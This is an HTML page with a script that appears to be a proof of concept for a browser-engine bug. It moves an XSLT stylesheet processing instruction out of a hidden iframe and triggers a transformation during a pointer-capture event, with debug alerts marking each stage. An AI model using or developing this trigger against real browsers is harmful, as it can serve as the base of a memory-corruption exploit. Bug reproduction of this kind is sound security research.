<body>
<script>
h1 = document.body.appendChild(document.createElement('h1'));
h1.textContent = 'please wait...';

cache_frame = document.body.appendChild(document.createElement('iframe'))
cache_frame.style.display = 'none';
pi = cache_frame.contentDocument.appendChild(
    document.createProcessingInstruction('xml-stylesheet',
        'type="text/xml" href="stylesheet.xml"'));
    alert("test 1 OK!");

setTimeout(() => {
  h1.textContent = 'click me';

  document.addEventListener('lostpointercapture', () => {
    document.write('x');
    document.firstChild.remove();

    document.appendChild(pi);
    document.appendChild(document.createElement('root'));

    document.close(); // triggers an XSLT transformation
      alert("test 2 OK!");
  });

  document.addEventListener('pointerdown', (event) => {
    document.body.setPointerCapture(event.pointerId);
  });
}, 2000); // enough time for the style sheet to be cached
    alert("test 3 OK!")
</script>
</body> 
